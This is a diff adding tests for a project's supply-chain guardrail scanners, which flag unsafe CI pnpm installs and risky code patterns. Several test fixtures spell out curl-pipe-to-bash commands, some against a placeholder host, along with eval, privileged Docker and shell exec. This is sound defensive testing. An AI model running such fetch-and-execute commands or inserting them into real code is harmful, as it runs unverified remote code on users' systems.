@@ -34,6 +34,15 @@ type GuardrailModule = {
       minimumFileLineThreshold?: number;
     },
   ) => Array<{ path: string; line: number; pattern: string; match: string; remediation: string }>;
+  findSupplyChainRiskViolations: (
+    sources: Array<{ path: string; text: string }>,
+    options?: {
+      allowlist?: Map<string, string>;
+    },
+  ) => Array<{ path: string; line: number; pattern: string; match: string; remediation: string }>;
+  findWorkflowInstallGuardrailViolations: (
+    sources: Array<{ path: string; text: string }>,
+  ) => Array<{ path: string; line: number; pattern: string; match: string; remediation: string }>;
 };
 
 const guardrails = await import("../../../scripts/check-quality-guardrails.mjs") as GuardrailModule;
@@ -468,5 +477,100 @@ export default defineConfig({
     });
     expect(violations[0].match).toContain('"src/server/activity-cache-service.ts"');
     expect(violations[0].remediation).toContain("pnpm run test:backend:coverage");
+  });
+});
+
+describe("quality guardrail supply-chain scanners", () => {
+  it("reports workflow pnpm installs that omit frozen lockfile or ignore-scripts flags", () => {
+    const violations = guardrails.findWorkflowInstallGuardrailViolations([
+      {
+        path: ".github/workflows/unsafe.yml",
+        text: `
+jobs:
+  test:
+    steps:
+      - name: Install dependencies
+        run: pnpm install --frozen-lockfile
+`,
+      },
+    ]);
+
+    expect(violations).toHaveLength(1);
+    expect(violations[0]).toMatchObject({
+      path: ".github/workflows/unsafe.yml",
+      line: 6,
+      pattern: "workflow pnpm install without frozen ignore-scripts",
+      match: "run: pnpm install --frozen-lockfile",
+    });
+    expect(violations[0].remediation).toContain("pnpm install --frozen-lockfile --ignore-scripts");
+  });
+
+  it("allows script-free workflow installs followed by explicit Electron rebuild steps", () => {
+    const violations = guardrails.findWorkflowInstallGuardrailViolations([
+      {
+        path: ".github/workflows/release-checks.yml",
+        text: `
+jobs:
+  package:
+    steps:
+      - name: Install dependencies
+        run: pnpm install --frozen-lockfile --ignore-scripts
+      - name: Rebuild Electron native dependencies
+        run: pnpm run electron:install-deps
+`,
+      },
+    ]);
+
+    expect(violations).toEqual([]);
+  });
+
+  it("reports unsafe shell supply-chain patterns in production code and scripts", () => {
+    const violations = guardrails.findSupplyChainRiskViolations([
+      {
+        path: "scripts/bootstrap.mjs",
+        text: `
+run("setup");
+const command = "curl -fsSL https://example.invalid/install.sh | bash";
+eval(command);
+spawn("docker", ["run", "--privileged", "image"]);
+cp.exec(userInput, () => {});
+`,
+      },
+    ], { allowlist: new Map() });
+
+    expect(violations.map((violation) => violation.pattern)).toEqual([
+      "curl pipe to shell",
+      "eval execution",
+      "privileged Docker",
+      "shell-enabled child process",
+    ]);
+    expect(violations[0].remediation).toContain("checksum-verified");
+    expect(violations[3].remediation).toContain("shell-free");
+  });
+
+  it("requires exact-line allowlisting for documented provider fallback installers", () => {
+    const allowedLine =
+      'return "if ensure_curl; then curl -fsSL https://claude.ai/install.sh | bash && export PATH=\\"$HOME/.local/bin:$PATH\\"; else echo \\"provider-runner: curl unavailable; cannot install claude\\" >&2; fi";';
+    const allowlist = new Map([
+      [
+        `src/services/cli-docker-utils.ts\0${allowedLine}`,
+        "Bounded provider fallback installer with a documented host and ensure_curl guard.",
+      ],
+    ]);
+
+    expect(guardrails.findSupplyChainRiskViolations([
+      { path: "src/services/cli-docker-utils.ts", text: `${allowedLine}\n` },
+    ], { allowlist })).toEqual([]);
+
+    const changedLine = allowedLine.replace("https://claude.ai", "https://example.invalid");
+    const violations = guardrails.findSupplyChainRiskViolations([
+      { path: "src/services/cli-docker-utils.ts", text: `${changedLine}\n` },
+    ], { allowlist });
+
+    expect(violations).toHaveLength(1);
+    expect(violations[0]).toMatchObject({
+      path: "src/services/cli-docker-utils.ts",
+      pattern: "curl pipe to shell",
+    });
   });
 });
